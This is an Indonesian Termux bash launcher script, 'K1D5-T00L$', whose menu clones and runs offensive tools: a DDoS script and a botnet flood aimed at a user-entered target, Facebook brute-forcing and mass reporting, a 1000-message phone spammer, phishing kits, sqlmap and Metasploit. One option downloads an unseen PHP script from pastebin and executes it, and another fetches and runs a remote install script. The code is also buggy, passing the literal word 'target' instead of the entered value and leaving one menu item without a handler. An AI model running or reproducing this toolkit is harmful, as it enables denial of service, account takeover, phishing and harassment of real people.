#!/system/xbin/bash
clear
blue='\033[34;1m'
green='\033[32;1m'                                        
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'                                           
yellow='\033[33;1m'
sleep 1
echo $red "
 _       __   ______  _______  ________________ _______ _       _______
| \    //  \ (  __  \(  ____ \ \__   __(  __   (  __   ( \     (  ____ \   
|  \  / \/) )| (  \  | (    \/    ) (  | (  )  | (  )  | (     | (    \/
|  (_/ /  | || |   ) | (____ _____| |  | | /   | | /   | |     | (_____ 
|   _ (   | || |   | (_____ (_____| |  | (/ /) | (/ /) | |     (_____  )
|  ( \ \  | || |   ) |     ) )    | |  |   / | |   / | | |           ) |
|  /  \ __) (| (__/  /\____) )    | |  |  (__) |  (__) | (____//\____) |
|_/    \/____(______/\______/     )_(  (_______(_______(_______\_______)"
sleep 1
echo ""
echo "\033[31;1m[============================]"
echo "\033[31;1mAuthor : ExUaRy"
echo "\033[37;1mKontak Me : 0895637008621"
echo "\033[37;1m[============================]"
sleep 1
echo ""
echo $green "Silahkan Pilih Tools:"
echo ""
echo $blue"[===============================================[>"
echo $purple"1.> Auto Like FaceBook"
echo $green"[===============================================]>"
echo $yellow"2.> Auto Reaction FaceBook"
echo $red"[===============================================]>"
echo $green"3.> Auto Comment FaceBook"
echo $red"[===============================================]>"
echo $yellow"4.> TXTOOL"
echo $cyan"[===============================================]>"
echo $green"5.> RED_HAWK"
echo $blue"[===============================================]>"
echo $red"6.> LITE DDOS"
echo $yellow"[===============================================]>"
echo $purple"7.> sqlmap"
echo $white"[===============================================]>"
echo $yellow"8.> Lazymux"
echo $cyan"[===============================================]>"
echo $red"9.> Auto Report FaceBook"
echo $green"[===============================================]>"
echo $purple"10.> Gado Gado"
echo $yellow"[===============================================]>"
echo $red"11.> Lazysqlmap"
echo $cyan"[===============================================]>"
echo $green"12.> Nuyul"
echo $blue"[===============================================]>"
echo $red"13.> MetasPloit"
echo $cyan"[===============================================]>"
echo $yellow"14.> Multi Brute Facebook"
echo $blue"[===============================================]>"
echo $purple"15.> Multi Spam"
echo $red"[===============================================]>"
echo $yellow"16.> IPGeolocation"
echo $white"[===============================================]>"
echo $blue"17.> Kawai-Botnet"
echo $green"[===============================================]>"
echo $purple"18.> Phising Game"
echo $purlpe"[===============================================]>"
echo $green"19.> SocialFish"
echo $red"[===============================================]>"
echo $blue"20.> Mulung"
echo $white"[===============================================]>"
echo $red"0.> keluar"
echo $green"[===============================================]>"
echo $cyan
read -p "root@K1D5-T00L$~#" bro

if [ $bro = 1 ] || [ $bro = 1 ]
then
clear
toilet "K1D5-T00L$"
cd module
php autolike.php
fi

if [ $bro = 2 ] || [ $bro = 2 ]
then
clear
toilet "K1D5-T00L$"
cd module
python2 auto_reaction.py
fi

if [ $bro = 3 ] || [ bro = 3 ]
then
clear
figlet "K1D5-T00L$" | lolcat
cd module
python2 botkomen.py
fi

if [ $bro = 4 ] || [ $bro = 4 ]
then
clear
figlet "K1D5-T00L$" | lolcat
git clone https://github.com/kuburan/txtool
mv txtool $HOME
cd $HOME/txtool
python2 install.py
python2 update.py
txtool
fi

if [ $bro = 5 ] || [ $bro = 5 ]
then
clear
toilet -f epic "K1D5-T00L$" 
sleep 3
apt update
apt install git
apt install php
git clone https://github.com/Tuhinshubhra/RED_HAWK
mv RED_HAWK $HOME
cd $HOME/RED_HAWK
chmod +x rhawk.php
php rhawk.php
fi

if [ $bro = 6 ] || [ $bro = 6 ]
then
clear
toilet -f epic "K1D5-T00L$"
sleep 3
apt update
apt install git
git clone https://github.com/4L13199/LITEDDOS
mv LITEDDOS $HOME
cd $HOME/LITEDDOS
read -p "MasukanTarget:" target
python2 LITEDDOS.py target 80 100
fi

if [ $bro = 7 ] || [ $bro = 7 ]
then
clear
toilet -f epic "K1D5-T00L$"
apt update
apt install git
git clone https://github.com/sqlmapproject/sqlmap
mv sqlmap $HOME
cd $HOME/sqlmap
read -p "masukan web target:" target
python2 sqlmap.py -D target
fi

if [ $bro = 8 ] || [ $bro = 8 ]
then
clear
figlet "K1D5-T00L$" | lolcat
apt update && upgrade
apt install python2 
apt install git
cd module
python2 lazymux.py
fi

if [ $bro = 10 ] || [ $bro = 10 ]
then
clear
figlet -f epic "K1D5-T00L$"
sleep 1
apt update && apt upgrade
apt install ruby
apt install lolcat
apt install git
git clone https://github.com/Senitopeng/GadoGado.git
mv GadoGado $HOME
cd $HOME/GadoGado
bash gado
fi

if [ $bro = 11 ] || [ $bro = 11 ]
then
clear
figlet -epic "K1D5-T00L$"
sleep 1
apt update && apt upgrade
apt install python2
apt install git
git clone https://github.com/verluchie/termux-lazysqlmap.git
mv termux-lazysqlmap $HOME
cd $HOME/termux-lazysqlmap
chmod 777 install.sh
./install.sh
lazysqlmap
fi

if [ $bro = 12 ] || [ $bro = 12 ]
then
clear
cowsay -f kiss.cow "K1D5-T00L$"
figlet "K1D5-T00L$"
sleep 1
pkg install php
pkg install wget
wget -O tuyul.php https://pastebin.com/raw/3ERZV3nL
mv tuyul.php $HOME
php $HOME/tuyul.php
fi

if [ $bro = 13 ] || [ $bro = 13 ]
then
clear
cowsay -f kiss.cow "K1D5-T00L$"
figlet "K1D5-T00L$"
sleep 1
pkg install curl
curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh
chmod +x metasploit.sh
./metasploit.sh
echo "Tunggu bntr"
sleep 5
mv metasploit-framework $HOME
cd $HOME/metasploit-framework
./msfconsole
fi

if [ $bro = 14 ] || [ $bro = 14 ]
then
clear
cowsay -f kiss.cow "K1D5-T00L$"
figlet "K1D5-T00L$"
echo "\033[33;1mTutorial Full Cara Pakai :" "\033[36;1m https://youtu.be/FsI4pCapfLY"
sleep 3
cd module
python2 mbf.py
fi

if [ $bro = 15 ] || [ $bro = 15 ]
then
clear
echo "\033[31;1m"
cowsay ghostbusters.cow "K1D5-T00L$" 
figlet "K1D5-T00L$"
apt update && apt upgrade
apt install python2
apt install python
apt install git
git clone https://github.com/Kereh/MultiSpam
mv MultiSpam $HOME
cd $HOME/MultiSpam
read -p "==== nomer target awalan [62] contoh 628xxxx===>" target
python2 Multispam.py --count=1000 target
sleep 1
fi

if [ $bro = 16 ] || [ $bro = 16 ]
then
clear
figlet "K1D5-T00L$"
echo "\033[33;1mFull Tutorial cara pakai :" "\033[36;1mhttps://youtu.be/VuCvj-8JIME"
sleep 3
apt install git
apt install python
apt install python2
git clone https://github.com/maldevel/IPGeoLocation.git
mv IPGeoLocation $HOME
cd $HOME/IPGeoLocation
chmod +x ipgeoLocation.py
pip install -r requirements.txt
python ipgeolocation.py -m
read -p "[Masukan IP/website]>" target
python ipgeolocation.py -t target
fi

if [ $bro = 17 ] || [ $bro = 17 ]
then
clear
cowsay -f kiss.cow "K1D5-T00L$"
figlet "K1D5-T00L$"
sleep 1
apt update && apt upgrade
apt install php
apt install git
git clone https://github.com/Cvar1984/Kawai-Botnet
mv Kawai-Botnet $HOME
cd $HOME/Kawai-Botnet
read -p "[Masukan Website Target]>:" target
php kawai.php target 4 0 9999
fi

if [ $bro = 18 ] || [ $bro = 18 ]
then
clear
toilet -f epic "K1D5-T00L$"
echo "\033[33;1muntuk tutorial kunjungi:" "\033[36;1m https://youtu.be/qJc1KaD3QcQ"
sleep 5
pkg install git
pkg install python2
git clone https://github.com/senitopeng/PhisingGame.git
mv PhisingGame $HOME
cd $HOME/PhisingGame
python2 phising.py
fi

if [ $bro = 19 ] || [ $bro = 19 ]
then
clear
toilet -f banner "K1D5-T00L$"
echo "\033[33;1mUntuk Tutorial Kunjungi:" "\033[36;1mhttps://youtu.be/LU0QMstAI88"
sleep 5
pkg install php
pkg install python2
pkg install git
pkg install curl
git clone https://github.com/Lexiie/SocialFish.git
mv SocialFish $HOME
cd $HOME/SocialFish
pip2 install wget
python2 SocialFish.py
fi 

if [ $bro = 20 ] || [ $bro = 20 ]
then
clear
toilet -f epic "K1D5-T00L$" -F gay
pkg install python
pkg install git
pkg install php
git clone https://github.com/Cvar1984/pemulungBTC.git
mv pemulungBTC $HOME
cd $HOME/pemulungBTC
php autoload.php
php mulung.php
fi

if [ $bro = 0 ] || [ $bro = 00 ]
then
toilet -f epic 'LOE NGENTOD' --filter border:metal -w 100
sleep 1
exit
fi

